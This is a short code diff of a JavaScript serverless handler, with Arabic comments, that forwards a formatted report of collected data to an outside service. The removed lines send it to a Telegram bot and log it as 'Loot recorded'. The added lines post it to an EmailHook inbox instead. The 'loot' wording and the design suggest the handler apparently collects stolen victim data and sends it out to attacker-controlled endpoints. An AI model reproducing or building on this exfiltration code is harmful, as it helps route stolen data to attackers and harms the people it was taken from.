@@ -14,22 +14,13 @@ export default async function handler(req, res) {
 ━━━━━━━━━━━━━━━━━━━━
   `;
 
-  // ✅ إرسال إلى القناة باستخدام Channel ID
-  const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
+  // ✅ إرسال مباشر إلى EmailHook (العنوان الجديد)
+  await fetch('https://api.emailhook.com/v1/inboxes/cmke7e6at01zw14i4a34ojt8e/emails', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ subject: 'تقرير جديد', text: readable })
+  });
 
-  try {
-    const reply = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: readable })
-    });
-    const result = await reply.json();
-    if (!result.ok) console.error('❌ Telegram error:', result);
-    else console.log('✅ Telegram sent, message_id:', result.result.message_id);
-  } catch (e) {
-    console.error('❌ Network error:', e);
-  }
-
-  console.log('🔥 Loot recorded:', JSON.stringify(data, null, 2));
+  console.log('🔥 EmailHook sent:', JSON.stringify(data, null, 2));
   res.status(204).end();
 }
